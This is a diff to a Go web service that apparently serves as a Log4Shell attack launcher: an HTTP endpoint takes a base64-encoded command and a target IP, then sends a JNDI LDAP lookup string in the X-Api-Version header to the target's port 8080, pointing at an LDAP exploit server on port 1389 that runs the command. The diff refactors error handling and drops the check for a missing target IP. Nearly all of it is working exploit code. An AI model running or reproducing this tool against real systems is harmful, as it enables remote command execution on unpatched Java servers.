@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -16,8 +17,6 @@ import (
 	"github.com/gin-gonic/gin"
 	externalip "github.com/glendc/go-external-ip"
 )
-
-var resultChannel = make(chan string)
 
 func main() {
 	router := gin.Default()
@@ -147,46 +146,43 @@ func main() {
 				"error": "Payload is required",
 			})
 			return
+		} else {
+			out, err := SendPayload(payload, targetip)
+			if err != nil {
+				c.JSON(500, gin.H{
+					"error": err.Error(),
+				})
+				return
+			} else {
+				c.JSON(200, gin.H{
+					"message": out,
+				})
+			}
 		}
-		if targetip == "" {
-			c.JSON(400, gin.H{
-				"error": "Target IP is required",
-			})
-			return
-		}
-		go SendPayload(payload, targetip, resultChannel)
-		result := <-resultChannel
-		c.JSON(200, gin.H{
-			"result": result,
-		})
 	})
 	router.Run(":8000")
 }
 
 // -------------------------- Start of Payload Sender -------------------------- //
-func SendPayload(payload string, targetip string, resultChan chan<- string) {
+func SendPayload(payload string, targetip string) (string, error) {
 	decodedPayload, err := base64.StdEncoding.DecodeString(payload)
 	if err != nil {
-		resultChan <- fmt.Sprintf("Error decoding payload: %s", err.Error())
-		return
+		return "", err
 	}
 	intIP, err := GetIntIP()
 	if err != nil {
-		resultChan <- fmt.Sprintf("Error getting internal IP: %s", err.Error())
-		return
+		return "", err
 	}
-	target := fmt.Sprintf("%s:8080", targetip)
+	target := targetip + ":8080"
 	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
 	if err != nil {
-		resultChan <- fmt.Sprintf("Target is not reachable: %s", err.Error())
-		return
+		return "", errors.New("target is not reachable")
 	}
 	conn.Close()
-	reqPayload := fmt.Sprintf("${jndi:ldap://%s:1389/Basic/Command/Base64/%s}", intIP.String(), payload)
+	reqPayload := "${jndi:ldap://" + intIP.String() + ":1389/Basic/Command/Base64/" + payload + "}"
 	req, err := http.NewRequest("GET", "http://"+target+"/", nil)
 	if err != nil {
-		resultChan <- fmt.Sprintf("Error creating HTTP request: %s", err.Error())
-		return
+		return "", err
 	}
 	req.Header.Add("X-Api-Version", reqPayload)
 	client := &http.Client{
@@ -194,19 +190,17 @@ func SendPayload(payload string, targetip string, resultChan chan<- string) {
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		resultChan <- fmt.Sprintf("Error sending HTTP request: %s", err.Error())
-		return
+		return "", err
 	}
 	defer resp.Body.Close()
 	respPayload, err := io.ReadAll(resp.Body)
 	if err != nil {
-		resultChan <- fmt.Sprintf("Error reading HTTP response: %s", err.Error())
-		return
+		return "", err
 	}
 	if string(respPayload) == "Hello, world!" {
-		resultChan <- "Payload sent successfully"
+		return "Payload sent successfully" + "to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload + " and Response-Payload: " + string(respPayload), nil
 	} else {
-		resultChan <- fmt.Sprintf("Payload sent with Decoded-Payload: %s and Request-Payload: %s and Response-Payload: %s", string(decodedPayload), reqPayload, string(respPayload))
+		return "Payload sent to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload + " and Response-Payload: " + string(respPayload), nil
 	}
 }
 
